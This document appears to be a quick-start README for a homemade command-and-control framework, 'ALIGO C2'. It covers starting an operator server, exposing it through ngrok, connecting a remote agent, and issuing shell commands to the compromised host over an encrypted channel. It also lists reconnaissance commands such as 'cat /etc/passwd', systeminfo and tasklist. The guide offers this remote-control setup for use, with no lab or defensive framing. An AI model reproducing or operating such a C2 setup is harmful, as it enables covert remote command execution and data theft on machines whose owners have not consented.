# 🚀 Crypto Implementation - Quick Start Guide

## Installation

### 1. Install Dependencies

```bash
cd /home/els4nchez/Music/aligo-c2-frameworkk
pip install -r requirements.txt
```

This will install:
- `flask==3.0.0` (Server web framework)
- `requests==2.31.0` (Agent HTTP client)
- `cryptography==41.0.7` (Encryption library)

### 2. Verify Installation

```bash
python3 test_crypto.py
```

**Expected output:**
```
╔==========================================================╗
║  ALIGO C2 - Crypto Implementation Test Suite           ║
╚==========================================================╝

[TEST 1] RSA-2048 Operations
==================================================
[*] Generating RSA-2048 keypair...
✓ Keypair generated
...
✅ ALL TESTS PASSED! Encryption ready for deployment
```

---

## Usage

### Step 1: Start Server

```bash
cd server
python3 server.py
```

**Output:**
```
============================================================
  ALIGO C2 - Servidor HTTPS con Cifrado Híbrido
============================================================
[*] Generando keypair RSA-2048 del servidor...
[✓] Keypair RSA generado exitosamente

[*] Servidor HTTP escuchando en 0.0.0.0:5000
[*] Usa ngrok con: ngrok http 5000
[*] Cifrado: RSA-2048 + Fernet (AES-128-CBC)

Consola de operador. Comandos:
  list                  -> lista agentes conectados
  use <agent_id> <cmd>  -> manda un comando a un agente
  use @agent <cmd>      -> usa el único agente
  exit                  -> salir

> 
```

### Step 2: Expose with Ngrok

In a **separate terminal**:

```bash
ngrok http 5000
```

Copy the HTTPS URL (e.g., `https://abc123.ngrok-free.app`)

### Step 3: Connect Agent

```bash
python3 agent/agent_ngrok.py https://abc123.ngrok-free.app
```

**Output:**
```
==================================================
  ALIGO C2 - Agente HTTPS con Cifrado Híbrido
==================================================

[*] Agente ID: agent-a1b2c3
[*] Servidor: https://abc123.ngrok-free.app
[*] Cifrado: RSA-2048 + Fernet (AES-128-CBC)
[*] Presiona Ctrl+C para detener

[*] Estableciendo handshake criptográfico...
[✓] Clave pública del servidor obtenida
[✓] Session key generada (Fernet)
[*] Intentando checkin con el servidor...
[✓] Check-in exitoso (session key intercambiada)
[+] ✅ Conectado al servidor como agent-a1b2c3
[+] 🔒 Canal cifrado establecido
```

### Step 4: Execute Commands

Back in the **server terminal**:

```
> list
 - agent-a1b2c3 | hostname | OS | last_seen: 14:30:45

> use @agent whoami
[enviado] id=f3a9 -> agent-a1b2c3: whoami

[resultado de agent-a1b2c3] (id=f3a9):
els4nchez

> use @agent pwd
[enviado] id=b2c4 -> agent-a1b2c3: pwd

[resultado de agent-a1b2c3] (id=b2c4):
/home/els4nchez
```

---

## 🔒 What's Encrypted?

### ✅ **Everything after handshake:**

1. **Commands** (Server → Agent)
   - Encrypted with agent's unique Fernet session key
   - Example: `whoami` → encrypted as `gAAAABl...` (base64)

2. **Results** (Agent → Server)
   - Encrypted with agent's unique Fernet session key
   - Example: `els4nchez` → encrypted as `gAAAABl...` (base64)

3. **Session Key Exchange**
   - Agent generates random Fernet key
   - Encrypts it with server's RSA-2048 public key
   - Server decrypts with RSA private key
   - All subsequent messages use this Fernet key

---

## 🧪 Test Commands

### Basic Commands

```bash
> use @agent whoami
> use @agent hostname
> use @agent pwd
> use @agent ls -la
```

### Windows Commands

```bash
> use @agent dir C:\Users
> use @agent systeminfo
> use @agent tasklist
> use @agent ipconfig
```

### Linux Commands

```bash
> use @agent cat /etc/passwd
> use @agent ps aux
> use @agent ifconfig
> use @agent uname -a
```

---

## 🐛 Troubleshooting

### Error: "ModuleNotFoundError: No module named 'cryptography'"

**Solution:**
```bash
pip install cryptography
# or
pip install -r requirements.txt
```

### Error: "Failed to decrypt session key"

**Cause**: Agent and server crypto keys are mismatched.

**Solution**: Restart both server and agent (new keys will be generated).

### Agent can't connect

**Check:**
1. Is server running? `curl http://localhost:5000/public-key`
2. Is ngrok running? `curl https://your-url.ngrok.io/public-key`
3. Is the agent using the correct URL?

---

## 📊 Comparison: Before vs After

| Aspect | Before | After |
|--------|--------|-------|
| **Commands** | Plain JSON | Fernet encrypted |
| **Results** | Plain JSON | Fernet encrypted |
| **Session Key** | N/A | RSA-2048 encrypted |
| **Interception risk** | ⚠️ High | ✅ Very low |
| **Tampering detection** | ❌ None | ✅ HMAC-SHA256 |
| **Man-in-the-middle** | ⚠️ Vulnerable | ✅ Protected |

---

## 📚 More Information

- **Full Documentation**: `CRYPTO_IMPLEMENTATION.md`
- **Architecture Details**: See "Encryption Architecture" section
- **Security Properties**: See "Security Properties" section

---

## ✅ Verification Checklist

- [ ] Dependencies installed (`pip install -r requirements.txt`)
- [ ] Test suite passes (`python3 test_crypto.py`)
- [ ] Server starts with RSA keypair generation message
- [ ] Agent shows "🔒 Canal cifrado establecido" message
- [ ] Commands execute successfully
- [ ] Results appear correctly in server console

---

## 🎯 Success Indicators

When encryption is working correctly, you'll see:

**Server:**
```
[+] Agente conectado: agent-abc123 desde 1.2.3.4 (hostname)
[*] Session key establecida (cifrado Fernet activo)
```

**Agent:**
```
[✓] Check-in exitoso (session key intercambiada)
[+] 🔒 Canal cifrado establecido
```

**Commands work normally** - the encryption is transparent to the operator!

---

## 🚀 You're Ready!

Your C2 framework now has **military-grade encryption**:
- ✅ RSA-2048 key exchange
- ✅ AES-128-CBC + HMAC-SHA256 payload encryption
- ✅ Unique keys per agent
- ✅ Zero plaintext in transit

**Happy hacking! 🔒🎉**
